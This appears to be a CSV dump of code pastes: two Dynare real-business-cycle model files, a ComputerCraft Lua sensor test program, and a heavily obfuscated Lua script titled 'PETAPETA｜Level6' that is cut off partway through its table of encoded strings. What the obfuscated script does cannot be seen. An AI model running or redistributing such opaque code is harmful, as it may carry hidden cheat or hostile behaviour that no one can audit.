id,title,username,language,date,content
JbggzvZb,rbc_log.mod,thanhqtran,MatLab,Friday 11th of July 2025 10:35:35 PM CDT,"// RBC log
var y c i n r w k A;
varexo e;

// params
parameters alpha beta sigma phi delta rhoa;
alpha = 0.63;
beta = 0.985;
sigma = 2;
phi = 1.5;
delta = 0.025;
rhoa = 0.95;

// model block
model(linear);

#Rss = (1/beta)-(1-delta);
#Wss = (1-alpha)*((alpha/Rss)^(alpha/(1-alpha))); 
#Yss = ((Rss/(Rss-delta*alpha))^(sigma/(sigma+phi))) *(((1-alpha)^(-phi))*((Wss)^(1+phi)))^(1/(sigma+phi));
#Kss = alpha*(Yss/Rss);
#Iss = delta*Kss;
#Css = Yss - Iss;
#Lss = (1-alpha)*(Yss/Wss);


//1-Consumption-labor supply
sigma*c + phi*n = w;
//2-Euler equation
(sigma/beta)*(c(+1)-c) = Rss*r(+1);
//3-Law of motion of capital
k = (1-delta)*k(-1) + delta*i;
//4-production function
y = A + alpha*k(-1) + (1-alpha)*n;
//5-demand for capital
r = y - k(-1);
//6-demand for labor
w = y - n;
//7-Equilibrium condition
Yss*y = Css*c + Iss*i;
//8-Productivity shock
A = rhoa*A(-1) + e;
end;

steady(maxit=1000);
check; 
model_diagnostics; 
model_info;

shocks;
var e; 
stderr 0.01; 
end;

stoch_simul(order=1, irf=80, tex) y c n w r i k A;"
ARHmta6Q,rbc.mod,thanhqtran,MatLab,Friday 11th of July 2025 10:30:32 PM CDT,"// RBC level
var Y C N W R I K A;
varexo e;

// params
parameters alpha beta sigma phi delta rhoa theta;
alpha = 0.35;
beta = 0.98;
sigma = 2;
phi = 1.5;
delta = 0.025;
rhoa = 0.95;
theta = 1;

// model block
model;
#Ass = 1;
//1-Consumption-labor supply
(C^sigma) * (theta * N^phi) = W;
//2-Euler equation
(C(+1)/C)^sigma = beta * (R(+1) + 1 - delta);
//3-Law of motion of capital
K = (1-delta)*K(-1) + I;
//4-production function
Y = A * K(-1)^alpha * N^(1-alpha);
//5-demand for capital
K(-1) = alpha * Y/R;
//6-demand for labor
N = (1-alpha) * Y/W;
//7-Equilibrium condition
Y = C + I;
//8-Productivity shock
A = exp( (1-rhoa)*log(Ass) + rhoa*log(A(-1)) + e);
end;

initval;
A = 1;
K = 10;
N = 0.3;
C = 1;
I = 0.25;
Y = 1.25;
R = 0.04;
W = 1;
end;



steady(maxit=1000);
check; 
model_diagnostics; 
model_info;

shocks;
var e; 
stderr 0.01; 
end;

stoch_simul(order=1, irf=40, tex) Y C N W R I K A;"
sJkvkUrP,Computercraft - Sensor test program,Rolcam,Lua,Friday 11th of July 2025 09:47:04 PM CDT,"--This is just a test prorgam so I can get familiar with various computercraft peripherals. Please excuse the mess.

-- load the API
os.loadAPI(""ocs/apis/sensor"")



-- Change the peripheral names accordingly
-- Prox = sensor (requires a proximity card) | mon = monitor | glass = terminal glass bridge | printer = printer
prox = sensor.wrap(""top"")
mon = peripheral.wrap(""left"")
glass = peripheral.wrap(""right"")
-- Set this to 0 to disable printing
printReadout = 1 
printer = peripheral.wrap(""bottom"")

-- get the targets
local targets = prox.getTargets()

--Redirects output to monitor
term.redirect(mon)
term.clear()
term.setCursorPos(1,1)
term.setTextColor(colors.yellow)
print(""Sensor Readout - Entities:"")
print()

glass.clear()
--List
glass.addBox(348,1,180,200,0xFFFFFF, 0.2)
glass.addText(350,2,""Radar Readout:"", 0xF2B233)
glassY = 12
-- Page tracker for printer
pgCt = 1

term.setTextColor(colors.white)
if printReadout == 1 then
	printer.newPage()
	printer.setPageTitle(""Radar Printout Page "" .. pgCt)
	-- Y value tracker for printer - will start a new page once it gets to the bottom
	printY = 1

	-- Updates the cursor position on the page = for printer
	printer.setCursorPos(1,printY)
end
-- Checks if the page is full. If so, it starts a new page
function printCheck ()
    if printY > 21 then
        -- Ends the page
        printer.endPage()
        -- Adds one to the page counter
        pgCt = pgCt + 1
        -- Starts a new page
    	printer.newPage()
		printer.setPageTitle(""Radar Printout Page "" .. pgCt)
        -- Resets printer Y position to 1
		printY = 1
		printer.setCursorPos(1,printY)
    end
end

-- loop through targets from sensor
for name, basicDetails in pairs(targets) do

    -- get more details about them
  local moreDetails = prox.getTargetDetails(name)
    -- Changes the text color to yellow if it lists a player. Otherwise, it's white
  if moreDetails.IsPlayer == true then
        term.setTextColor(colors.yellow)
        print(""Found player: ""..name)
        if printReadout == 1 then
        	printer.setCursorPos(1,printY)
        	printer.write(""Found player: ""..name)
        	printY = printY + 1
        	printCheck()
        end
  else
        term.setTextColor(colors.white)
        print(""Found entity: ""..name)
        if printReadout == 1 then
        	printer.write(""Found entity: ""..name)
        	printY = printY + 1
        	printCheck()
        end
  end
    
    
  -- print their health
  print(""Health: ""..moreDetails.Health)
  if printReadout == 1 then
  	printer.setCursorPos(1,printY)
  	printer.write(""Health: ""..moreDetails.Health)
  	printY = printY + 1
  	printCheck()
  end
  term.setTextColor(colors.white)
  print(""------"")
  if printReadout == 1 then
  	printer.setCursorPos(1,printY)
  	printer.write(""------"")
  	printY = printY + 1
  	printCheck()
  end
end

if printReadout == 1 then
	printer.endPage()
end
term.restore()

function glassCheck()
    if glassY > 200 then
        sleep(5)
        glass.clear()
        glass.addBox(348,1,180,200,0xFFFFFF, 0.2)
		glass.addText(350,2,""Radar Readout:"", 0xF2B233)
		glassY = 12
    end
end

-- loop through targets from sensor
for name, basicDetails in pairs(targets) do
    
     -- get more details about them
  local moreDetails = prox.getTargetDetails(name)
    -- Changes the text color to yellow if it lists a player. Otherwise, it's white
if moreDetails.IsPlayer == nil then  
        glass.addText(350,glassY,""Found ??????: ""..name, 0xF2B233)
        glassY = glassY + 10
    	glassCheck()
elseif moreDetails.IsPlayer == true then
        glass.addText(350,glassY,""Found player: ""..name, 0xF2B233)
        glassY = glassY + 10
    	glassCheck()
  else
        glass.addText(350,glassY,""Found entity: ""..name, 0x000000)
        glassY = glassY + 10
    	glassCheck()
  end
    
  -- print their health
  glass.addText(350,glassY,""Health: ""..moreDetails.Health, 0x000000)
  glassY = glassY + 10
  glassCheck()
  glass.addText(350,glassY,""------"", 0x000000)
  glassY = glassY + 10
  glassCheck()
end
"
L0smJ0Yq,PETAPETA｜Level6,OK2020,Lua,Friday 11th of July 2025 09:29:12 PM CDT,"return(function(...)local q={""\078\080\076\098\051\108\118\065\109\068\061\061"";""\089\104\051\053\070\105\068\054"";""\119\084\057\106\056\050\111\075\047\068\061\061"",""\107\090\087\047\084\104\047\069\105\068\112\047"";""\117\103\078\043\121\056\117\069\103\050\106\061"",""\088\114\090\108\098\048\073\103\073\083\061\061"",""\114\105\120\054\073\077\081\114\082\072\061\061"";""\056\114\057\075\111\043\076\120\105\114\099\104\113\105\065\043"";""\112\082\099\122\067\090\070\065"";""\102\049\112\122\083\048\078\053\120\117\121\100"",""\122\116\109\052\119\107\108\103\120\080\068\086\083\106\065\068\122\072\061\061"",""\106\056\086\084\083\087\074\061"",""\079\081\067\084\099\072\061\061"";""\051\075\085\085\084\074\101\080\120\069\088\051\052\068\061\061"",""\088\103\053\116\098\054\090\110\077\057\053\047\068\069\056\119"";""\068\090\107\055\110\071\120\050"",""\090\057\103\110\049\048\049\082\098\118\056\108\068\071\121\082\052\087\068\061"",""\101\090\107\050\089\082\048\061"",""\043\043\065\119\085\102\110\057"",""\073\087\081\054\117\072\061\061"";""\121\083\120\050\087\056\072\061"",""\070\120\052\121\089\100\109\076\110\120\061\061"";""\082\074\109\080\088\068\061\061"",""\077\116\072\087\099\052\083\115\118\068\061\061"";""\054\055\066\116\057\080\079\056"",""\118\078\086\116\080\086\098\061"";""\082\120\108\088\079\120\061\061"",""\053\071\053\047\120\055\082\121\085\066\048\116"",""\113\084\117\085\121\049\116\117\102\120\061\061"";""\102\121\105\070\078\074\108\061"";""\085\083\066\116\055\080\089\076\070\112\056\110\054\110\107\061"";""\049\072\043\115\050\052\052\098\109\068\061\061"",""\054\071\055\076\050\076\085\074"",""\052\057\112\118\107\083\061\061"";""\055\111\090\103\048\088\049\065\098\108\121\082"";""\097\088\102\057\080\122\065\078\118\083\111\105\090\043\048\050"",""\056\047\051\053\073\067\098\100\053\079\069\090"",""\122\056\073\102\069\113\051\056\101\098\120\061"";""\097\051\080\056\056\074\073\117"",""\071\057\113\049\098\097\113\118"";""\108\120\106\066\080\052\103\055\107\072\102\049"";""\121\101\054\072\120\084\115\099"",""\116\118\122\061"",""\078\057\043\102\100\105\122\061"";""\083\112\104\080\085\070\071\080\065\072\061\061"";""\078\051\077\116\086\072\118\100\076\078\087\066\081\075\108\088\069\081\118\071\097\065\077\061"",""\077\118\103\108\049\068\061\061"",""\054\070\074\116\072\118\090\102"";""\073\120\066\069\080\049\089\110"",""\085\105\102\072\053\100\056\121\107\065\111\078\108\088\057\121"",""\110\122\077\083\082\071\087\097\097\098\121\098\057\100\080\118\114\083\055\105\050\083\061\061"",""\098\071\069\108\052\113\069\108\077\111\090\121\077\057\047\103"";""\109\113\077\078\082\081\117\100\078\085\087\043"";""\118\065\051\085\113\100\120\061"";""\072\102\107\115\104\068\051\069\106\112\051\061"",""\068\071\121\121\052\057\073\103\101\102\090\121\073\087\101\061"",""\065\106\049\115\068\105\074\074\076\048\047\110\088\098\047\082"",""\114\102\068\072\114\082\088\047\054\103\083\061"";""\117\114\111\109\122\052\053\073\085\083\061\061"",""\055\049\079\056\102\113\118\043\107\090\084\055"",""\083\073\104\086\077\116\118\118\070\117\103\116\048\108\102\052"",""\097\118\076\099\076\098\101\102\088\053\090\049"",""\066\098\119\113\051\070\047\074"",""\111\075\043\116\049\111\090\121\073\087\081\067\052\087\101\061"";""\069\101\090\082\052\070\106\061"",""\057\100\078\118\077\101\077\069\068\115\117\111\090\111\120\061"",""\081\103\055\053\097\080\098\066"",""\090\057\103\110\049\048\049\082\098\118\056\108\068\071\121\082\052\087\090\084\049\051\056\107\077\111\056\054"",""\098\082\120\051\079\085\076\115\081\113\097\102\119\088\115\122\112\087\088\086\081\098\079\057\111\113\090\084"";""\110\077\085\113\118\107\074\110\057\099\054\119\112\106\055\057"";""\118\070\121\089\067\111\115\108\070\122\079\067\068\066\097\061"",""\081\056\074\088\065\057\119\051\075\069\068\061"";""\111\084\048\086\121\072\061\061"";""\078\076\100\121\112\084\043\102\101\065\057\097\050\111\102\079"",""\068\057\069\117\098\118\081\049\070\069\068\071\113\111\068\105"";""\052\081\053\048\073\114\103\087\101\071\055\118\085\113\108\071\098\069\068\061"";""\054\099\074\068\070\085\112\081\056\053\055\052\088\080\087\074\083\083\061\061"",""\101\071\069\108\090\057\043\107\049\087\069\105"",""\122\068\077\106\065\065\080\081\120\100\065\084\101\117\069\053"",""\090\054\069\108\113\111\103\065\113\069\103\075\117\113\043\074\088\120\061\061"";""\072\106\066\101\067\108\075\113\069\076\080\077\109\047\051\061"";""\074\047\118\122\069\121\048\088"";""\054\069\068\087\087\120\057\053\056\112\050\101"",""\080\122\106\103\089\121\118\116\102\115\072\107\068\084\119\097"",""\073\071\043\105\117\102\056\072\077\113\056\103"",""\111\075\043\107\049\113\097\061"";""\054\112\066\103\113\054\114\087\100\078\097\061"",""\072\069\070\121\066\085\052\119\043\120\061\061"";""\076\113\049\047"",""\055\087\065\050\121\111\053\108\052\116\043\089\050\076\068\071\073\086\099\089\048\048\120\061"";""\049\069\104\110\102\072\061\061"";""\049\102\056\075\077\120\061\061"";""\083\115\105\073\112\120\061\061"";""\112\097\112\051\116\081\122\068\083\075\065\057\110\119\084\080"",""\099\057\051\105\090\054\053\051\052\101\056\085\101\111\053\112\099\101\051\061"",""\110\118\115\080\074\055\043\084\114\081\055\121"";""\077\107\105\119\101\072\116\075\067\070\078\049\115\071\088\070\113\048\071\101\047\120\061\061"";""\080\097\102\120\057\109\106\079"";""\065\074\053\076\101\079\114\066\071\071\076\061"";""\086\071\076\104\077\120\121\067\107\072\082\053\099\085\050\106\055\099\106\050\079\057\053\108\054\110\075\073\077\072\061\061"";""\101\071\069\108\070\087\103\067\098\057\081\105\099\068\061\061"",""\070\070\106\105\052\111\080\109\098\108\053\119\049\108\103\102\113\068\061\061"",""\111\087\051\103\097\098\097\061"";""\067\051\106\066\099\067\055\078\081\043\110\099\047\120\053\070\053\105\100\050\048\068\061\061"",""\076\067\043\077\080\080\075\112\066\083\061\061"",""\065\082\084\108\105\067\068\112\066\082\122\113\107\116\097\068\108\100\083\061"",""\122\098\111\065\111\081\103\053\100\074\108\104\080\098\074\061"";""\075\086\073\071\079\068\061\061"";""\106\043\119\100\086\081\118\048\078\122\071\070"";""\121\054\108\113\088\120\061\061"";""\077\071\121\121\098\120\061\061"",""\052\116\047\079\100\050\090\070\070\068\061\061"",""\066\108\111\076\089\081\107\097\047\122\122\056\122\112\066\080"",""\119\106\108\106\072\100\107\070\114\075\101\115\072\086\101\120\050\077\049\068\069\083\061\061"",""\069\107\121\084\119\048\120\113\051\120\061\061"",""\106\067\066\072\065\071\118\116\105\105\122\070\079\079\049\072"";""\089\076\090\097\081\057\121\089\120\101\087\110\081\116\106\068\077\083\061\061"",""\117\109\088\050\099\122\055\057\065\118\056\054"";""\081\118\120\079\100\108\110\071\084\120\061\061"";""\088\065\086\043\108\066\122\061"";""\069\103\090\090\088\103\083\071\068\054\056\090\117\119\080\084\052\113\098\061"";""\049\071\081\116\049\068\061\061"";""\090\073\121\106\073\115\115\107\083\072\061\061"",""\089\067\068\097\084\079\057\117\102\068\061\061"";""\049\102\069\090\098\071\043\108\088\111\121\103\056\069\077\072\101\108\068\061"";""\114\098\077\118\106\082\102\102"";""\089\111\078\107\104\072\061\061"",""\087\104\118\076\110\111\122\053\099\055\056\106"";""\073\088\111\079\099\120\104\084"",""\056\119\073\080\101\075\073\112\056\111\056\087\052\069\082\069\073\083\061\061"",""\117\118\049\076\069\101\051\054\101\069\080\076\088\103\069\089\098\048\098\061"",""\068\106\054\108"",""\065\086\098\111\072\108\099\111\121\065\103\112"",""\111\075\043\082\052\057\090\103\099\083\061\061"";""\076\109\071\075\121\110\117\086\048\053\114\101"",""\098\102\103\068\117\071\073\106\069\103\080\110\076\118\080\084"";""\101\052\076\118\050\055\057\085\053\114\078\118\090\120\061\061"",""\109\069\101\108\109\076\080\047\048\072\116\049\047\066\120\072"";""\048\109\067\047\103\102\108\061"",""\111\075\043\118\077\072\061\061"";""\084\056\049\099\106\073\056\078"";""\090\071\069\108\068\071\121\082\052\087\090\105\049\113\097\061"",""\070\100\098\065\055\109\105\048"";""\081\103\079\080\043\101\043\043\073\065\108\061"";""\077\069\082\100\089\080\074\067\116\100\090\053\102\071\101\061"";""\068\102\053\103\077\111\090\103\069\071\103\110\049\087\043\102"",""\069\087\116\053\090\075\073\086\090\071\121\068\068\070\098\105\056\111\083\061"";""\117\107\089\080\043\087\107\061"",""\119\107\069\065\085\097\103\049\112\121\103\107\113\075\107\118\071\047\098\080"",""\069\087\081\116\098\087\069\105\106\048\090\103\073\087\069\119\073\087\069\051\106\068\061\061"";""\088\113\073\110\052\102\053\103\069\087\121\103\052\113\069\070\049\111\090\108\117\113\055\118\098\072\061\061"";""\111\109\070\114\056\051\054\118\101\072\061\061"";""\098\102\090\105\117\113\055\118"",""\090\071\069\108\101\071\069\105\073\057\103\119\049\068\061\061"";""\098\087\081\082\098\118\076\061"",""\086\086\090\079\090\066\099\121\104\056\085\108"",""\075\053\110\100\122\106\106\061"";""\105\098\075\122\114\080\122\107"";""\098\068\116\087\075\084\083\061"";""\051\114\082\070\105\054\108\076\050\119\068\105\043\080\122\061"";""\052\087\043\121\049\114\056\108\098\057\103\110\049\072\061\061"",""\116\088\054\119\088\051\056\121\105\052\072\057\051\090\048\061"",""\048\081\084\080"";""\097\110\099\104\048\051\090\082\084\068\122\061"";""\109\116\098\055\052\121\086\120\078\043\083\080\122\050\056\118"",""\068\075\076\108\052\070\053\081\098\101\053\065\056\119\073\101"",""\053\104\107\109\075\052\051\112\071\109\077\088"";""\112\113\069\048\053\118\108\069\117\108\113\102"";""\113\077\085\119\113\070\069\122\113\097\120\102\119\074\083\077"",""\067\100\109\073\101\105\051\061"";""\098\084\110\043\090\072\061\061"",""\108\083\108\102\068\118\080\111\074\082\079\085\057\080\083\061"";""\049\051\103\114\090\054\069\113\052\102\068\097\077\071\047\115\098\057\076\061"",""\050\104\065\084\069\043\072\070\057\082\107\061"",""\114\081\073\114\077\122\088\072"";""\070\087\043\121\049\048\081\075\073\087\043\107\052\071\081\051\068\071\043\110\049\057\103\118"",""\115\099\077\116\116\083\073\118"";""\048\113\048\075\101\071\070\073\089\084\106\108"",""\121\122\077\065\049\047\074\061"",""\113\118\069\051\068\118\074\075\113\113\082\051\088\057\121\090\068\068\061\061"",""\099\077\122\077\080\102\097\049"",""\122\114\052\049\057\047\084\121\105\071\051\061"";""\074\114\119\102\097\073\118\070\054\120\061\061"",""\097\079\086\051\070\056\109\052"",""\056\101\106\072\049\048\121\112\069\070\073\102\090\102\049\051"";""\070\043\055\067\112\065\097\100\047\072\061\061"";""\117\048\075\121\052\057\048\072\117\057\069\110\101\101\053\068\049\102\083\061"";""\083\108\052\121\108\119\109\112\073\068\061\061"",""\048\073\102\099\081\102\100\110\067\110\057\074\108\083\061\061"",""\088\057\098\097\088\109\090\112\113\118\069\113\070\113\049\087\056\068\061\061"";""\102\115\089\090\112\070\098\079\051\055\107\061"",""\057\055\055\075\115\099\048\054"";""\100\101\105\101\115\098\086\071\122\109\052\079\085\110\085\072"";""\079\100\100\085\102\120\061\061"",""\106\098\075\098\081\088\065\071"";""\086\099\105\117\083\099\087\109\086\112\067\073\076\086\085\073"",""\109\113\101\118\084\116\088\109"",""\049\057\047\115\052\102\106\061"",""\087\099\071\100\053\112\073\122\081\068\061\061"";""\049\109\103\109\116\105\055\049\055\068\061\061"",""\109\105\068\074\066\054\068\061"";""\078\113\051\101\083\101\120\090\079\121\051\061"",""\066\117\047\105\083\084\111\080\052\068\061\061"",""\119\108\101\070\098\050\070\082\084\083\061\061"",""\088\051\121\065\068\071\075\054\056\069\074\055\088\057\103\106"";""\115\050\056\111\111\067\107\075\112\084\069\098\106\053\121\118\111\100\065\108\086\068\061\061"";""\104\106\043\075\055\121\054\072\055\048\106\114\107\120\071\050\113\069\043\108\079\105\077\068\047\078\106\085\053\049\112\119\056\056\108\107\054\051\078\051\121\071\121\101\047\100\066\103\122\070\078\114\121\056\088\055\074\051\118\073\052\055\087\056\098\111\107\117\081\080\118\103\121\099\120\050\108\074\043\103\056\105\120\114\068\111\101\119\097\112\073\069\087\081\067\069\120\074\119\081\120\119\114\120\047\108\054\082\050\089\084\072\085\054\070\051\054\097\083\061"",""\082\119\077\087\113\072\088\098"";""\073\087\043\110\073\113\075\067\049\111\106\061"",""\082\072\113\086\121\078\106\055\118\065\071\089"",""\068\079\074\108\050\072\049\047\056\057\079\047"";""\056\108\056\070\098\101\103\065\068\111\049\102\088\057\069\055\069\083\061\061"",""\068\071\079\066\079\085\102\070"",""\072\117\075\100\082\099\088\069"",""\117\121\112\077\057\078\097\074\076\076\072\061"";""\115\050\048\054\075\066\072\061"",""\085\053\109\109\105\089\097\121\069\108\068\061"";""\119\098\065\071\088\072\049\071"",""\088\075\085\051\072\116\072\119\116\110\111\085\119\104\056\113"";""\067\121\053\104\115\119\107\061"",""\119\101\073\053\098\068\048\061"";""\073\114\081\097\097\052\056\104"";""\052\103\101\082\107\117\102\103"";""\055\087\079\049\078\118\054\111\076\112\072\114\110\082\068\061"";""\053\067\109\057\074\070\114\078\120\056\083\061"";""\088\082\088\075\118\111\114\078\050\100\120\061"";""\077\101\122\072\052\114\121\115\049\118\069\114\052\075\103\104\085\068\061\061"";""\050\106\047\065\102\104\079\108"",""\084\047\084\055\067\079\088\119"";""\068\118\069\082\052\087\090\053\052\118\090\103\098\057\049\121\077\071\069\070\049\113\056\108\117\113\043\110"",""\052\113\081\107\098\113\120\072\099\057\106\105\085\113\073\105"";""\069\118\076\078"";""\071\043\084\113\069\080\053\049\055\068\057\054"";""\077\117\082\081\097\052\104\076\067\072\061\061"";""\074\108\122\065\087\107\068\061"";""\067\081\070\086\104\068\053\084"",""\077\075\082\077\088\102\053\107\052\119\121\111\069\057\047\119"";""\090\054\053\086\073\119\069\076\049\114\076\047\101\070\106\075"",""\068\110\070\109\067\090\117\079\090\072\061\061"";""\122\053\073\051\083\078\053\088\052\070\109\111\070\070\065\104\086\120\120\061"";""\047\113\100\072\049\055\068\061"",""\073\070\088\056\050\116\083\109\055\103\122\061"";""\067\117\070\105\104\068\109\081\048\083\061\061"";""\103\116\119\111\051\117\082\075"";""\085\069\119\055\118\114\122\078\121\116\122\100\069\117\081\106"";""\049\100\072\055\084\077\116\071\072\068\061\061"",""\048\089\107\118\071\055\086\086"";""\110\090\078\052"",""\089\043\101\106\071\097\114\113\080\075\117\108\050\107\082\043\054\111\071\077\115\071\104\073"";""\101\071\069\107\049\113\056\108\069\087\081\067"",""\073\113\055\072\077\113\056\089"";""\118\050\104\118\097\107\074\066\080\078\083\061"",""\088\051\055\109\113\087\073\071\069\071\073\069\070\087\069\121\077\075\120\061"";""\076\047\065\121"";""\065\054\083\057\052\090\082\070\074\055\099\100"";""\102\099\110\084\065\086\119\067\074\048\076\087\047\104\106\061"";""\110\116\076\072\097\080\079\120"",""\076\111\056\118\076\087\075\104\090\048\049\072\070\108\053\111\076\083\061\061"";""\112\082\101\056\110\068\090\071\047\107\118\043\079\122\054\081\057\056\115\111\067\120\061\061"",""\073\087\081\067\052\087\101\061"",""\068\118\069\082\052\087\090\109\052\071\055\057\117\113\073\070\049\113\056\108\117\113\043\110"",""\088\111\056\080"";""\076\074\112\112\106\065\049\056"";""\085\067\103\111\043\104\109\097\104\090\067\099"";""\100\100\098\066"";""\067\099\084\112\100\100\050\115\118\080\101\061"";""\099\081\070\106\079\106\048\052\115\101\114\121"";""\054\054\079\081\119\081\050\098"",""\057\083\083\107\098\057\083\079\098\120\061\061"";""\052\085\054\056\097\082\076\087\074\056\116\098\048\068\061\061"";""\052\113\081\108\117\083\061\061"";""\108\074\088\119\078\066\082\111\090\105\085\090\101\049\107\047\072\068\061\061"",""\098\087\056\121\052\087\072\061"";""\048\056\051\053\054\079\106\121\047\099\115\101\109\117\068\061"";""\055\079\087\097\065\083\061\061"";""\054\090\069\074\048\088\083\122\043\114\074\061"",""\108\054\078\077\104\052\080\117"",""\102\106\100\076\117\082\080\117\081\050\083\115\074\103\053\078"",""\068\069\097\051\112\118\103\122\071\090\108\109\079\084\122\061"";""\047\101\088\105\120\048\088\090\078\085\088\103\072\067\070\053"";""\099\103\120\102\113\101\051\054\090\071\107\072\068\071\056\051"";""\090\108\043\117\088\075\121\117\077\113\103\087\117\119\081\051\069\120\061\061"",""\105\079\068\116\069\050\043\049"";""\105\071\108\086\070\055\065\086\074\072\061\061"";""\112\055\079\115\056\112\057\117\069\083\061\061"";""\082\047\106\110\116\071\107\074\070\070\080\074\108\083\061\061"";""\120\106\052\099\054\075\102\069\080\102\116\100\053\119\076\061"",""\103\078\057\106\051\101\056\048"",""\114\050\072\104\121\104\097\061"",""\053\099\079\101\088\116\068\050\099\115\048\118\071\122\072\106\114\069\070\116\088\068\061\061"",""\068\113\090\051\069\087\081\067"",""\074\065\098\113\054\083\117\103\075\098\110\068\050\114\122\100"";""\088\102\090\103\077\101\048\105\117\071\056\051\085\048\081\121"",""\071\052\073\052\087\083\080\066\056\100\099\080\109\117\052\079\120\056\074\102\056\116\098\051\113\043\067\048"",""\118\113\116\068\107\078\069\102\071\117\090\071\105\090\068\105"",""\122\115\114\111\097\106\122\087\111\079\116\049\080\089\106\061"";""\067\077\117\106\076\072\061\061"";""\098\111\049\051\090\102\081\082\069\071\043\054\052\069\053\101\070\072\061\061"",""\068\057\116\075\113\057\108\075\090\108\116\078\076\054\049\080"",""\052\054\121\102\076\057\121\072\069\113\082\069\113\119\069\069\076\068\061\061"",""\049\119\101\052\108\101\111\102"";""\110\066\088\106\052\102\114\090\105\074\069\043\108\076\116\102\105\056\072\081\089\072\061\061"",""\090\087\069\054\073\114\053\115\099\068\061\061"";""\081\108\120\067\121\110\077\115\089\120\061\061"";""\102\097\073\073\111\081\116\110\072\051\080\090\075\077\097\113\114\083\077\080"";""\079\104\102\084\090\054\065\086\085\048\056\089"",""\122\050\108\103\049\114\071\076"";""\043\077\051\114\119\051\097\053\110\122\102\116\084\100\050\097\098\068\061\061"";""\073\076\048\049\079\080\053\119\110\108\106\121"";""\105\089\087\071\105\079\048\061"";""\097\080\107\049\097\099\048\066\077\082\122\061"";""\071\106\121\081\049\116\051\075\072\072\043\072"",""\121\090\086\075\118\098\051\061"",""\080\099\074\087"";""\048\111\083\098\115\089\070\108\112\112\101\049"";""\075\081\104\104"",""\049\111\053\105\052\102\106\061"",""\056\117\068\082\088\070\109\097\115\066\097\101\112\068\061\061"",""\085\113\073\049\049\087\106\055\101\075\103\112\049\111\098\047\117\072\061\061"",""\101\102\081\107\056\048\121\088\070\119\069\087\052\113\116\112\068\057\101\061"";""\047\101\069\103\121\055\066\102"";""\051\067\083\112\114\047\097\061"",""\104\115\070\054\080\111\065\097\118\071\085\113"",""\119\076\053\083\072\047\107\071\069\120\061\061"";""\100\075\082\106\120\075\103\108\112\116\103\087"",""\084\051\087\070\053\082\117\106"";""\053\087\119\106\065\113\101\089"";""\051\055\049\114\122\067\048\119\120\122\051\061"",""\117\047\101\115\100\113\108\071\113\083\061\061"";""\116\121\075\108\052\109\074\048"";""\119\105\109\117\065\068\061\061"";""\112\053\084\113\082\118\054\057\116\097\120\061"";""\072\110\107\086\105\109\116\085"";""\101\087\070\122\098\088\098\061"",""\056\070\076\074\084\053\109\080\119\119\122\061"",""\049\071\116\107\101\118\103\115\073\069\103\119\070\114\090\080\077\068\061\061"";""\049\105\102\073\054\101\051\122\081\084\083\108\090\067\098\078\117\114\074\067\119\066\052\117\067\072\061\061"",""\089\090\104\100"",""\119\070\080\071\065\116\115\049\105\068\114\078\084\083\061\061"",""\113\114\090\051\073\114\069\082\076\118\103\076\101\119\076\072\077\068\061\061"";""\076\073\105\077\116\071\052\101\087\053\098\061"";""\119\102\098\057\080\112\090\075\098\077\099\118\066\076\083\061"",""\121\075\071\121\084\098\048\061"",""\101\106\079\073\084\103\121\086\121\056\098\087"",""\085\067\120\103\049\104\074\082\085\120\061\061"";""\115\084\104\076\108\090\111\085"",""\102\047\067\090\051\083\061\061"",""\048\057\109\087\070\053\097\066\114\116\101\053\068\119\114\085"";""\074\112\047\055\107\086\071\075\098\120\061\061"",""\099\075\077\065\084\098\112\074\100\113\113\073\100\083\061\061"",""\048\049\109\089\114\101\116\070"";""\055\097\122\116\043\081\107\061"";""\090\122\047\049\087\053\101\082\090\056\109\102\051\120\110\073"";""\049\071\075\121\073\087\056\074"",""\090\087\103\054\077\071\043\110\052\057\069\119\073\083\061\061"";""\108\057\109\050\088\118\073\052"",""\057\105\051\082\112\106\112\108\075\068\061\061"";""\068\071\043\110\052\057\069\119\073\083\061\061"",""\097\076\055\077\107\081\086\070"";""\052\087\069\110"",""\070\055\101\072\087\108\053\067"";""\051\047\110\116\118\084\052\089\072\120\061\061"",""\077\051\076\071\076\057\050\105\076\050\080\083"",""\074\081\100\099\112\090\072\099\084\120\061\061"";""\116\109\048\108"",""\069\071\103\113\052\054\049\113\069\070\069\110\052\054\081\119\113\103\098\061"",""\100\118\075\073\054\102\048\061"",""\117\111\080\121\117\111\053\054"";""\076\048\097\108\056\108\082\089\099\087\049\065\117\070\080\074"",""\111\083\114\047\079\053\104\077\056\052\074\054\077\089\054\109"";""\111\071\098\077\100\102\076\099"",""\074\067\098\069\085\047\107\122\100\103\107\103\072\047\118\080\071\107\100\099\085\120\061\061"",""\052\113\120\108\076\075\098\055\070\054\069\067\113\051\055\109\073\068\061\061"";""\075\116\097\048\121\083\061\061"";""\100\110\084\107\068\068\120\065\072\120\061\061"",""\070\106\121\085\107\112\074\061"",""\112\087\107\109\097\072\061\061"";""\068\107\085\052\109\056\080\114"",""\108\072\107\108\100\120\061\061"",""\117\054\085\052\055\108\120\115\083\120\083\061"",""\068\079\101\120\106\100\056\097\120\076\088\108\053\109\055\121"";""\048\119\082\074\054\087\048\061"",""\068\071\043\107\052\102\106\054"",""\080\088\089\057\084\077\097\048\055\049\069\069"";""\110\043\100\104\102\083\061\061"",""\086\111\086\105\110\068\074\061"";""\053\053\105\107\077\078\101\113\119\069\076\061"";""\076\097\067\066\098\085\108\065\116\116\119\104\051\098\056\088"",""\117\108\073\054\056\057\121\072\068\068\061\061"",""\066\073\113\114\079\112\108\061"",""\104\078\087\100\085\073\048\061"",""\122\122\117\085\119\070\101\061"";""\109\085\116\047\047\068\061\061"";""\104\117\054\066\119\087\108\100\107\099\065\070\077\068\061\061"";""\056\056\103\080\097\053\108\086\055\099\054\069\075\102\090\050"";""\048\055\108\109\117\075\088\051\078\121\111\098\079\070\117\121\068\068\061\061"";""\082\116\108\098\054\072\061\061"";""\102\110\076\116\056\052\070\078\102\072\061\061"";""\065\118\066\105\100\048\084\067"",""\054\055\102\057\079\066\090\111\105\067\101\077\074\068\067\076\047\113\122\067\049\107\121\121\089\119\087\084\087\120\061\061"";""\053\110\090\057\116\055\074\061"";""\072\080\112\119\071\074\053\087\113\113\048\100\071\068\098\061"";""\050\068\049\122\108\113\070\070\050\119\088\106"";""\077\085\071\114\084\121\106\068"",""\067\071\100\102"",""\113\082\081\067\072\098\113\065\069\073\076\061"";""\090\088\073\103\090\113\108\110"";""\075\070\081\120\102\055\073\122\076\074\097\061"",""\065\106\086\086\106\118\069\051\090\100\108\061"",""\087\080\051\089\070\090\087\051"";""\098\051\081\084\077\051\047\109\069\087\106\108\076\087\048\054"",""\098\082\107\087\047\114\117\085\081\114\087\088"";""\117\071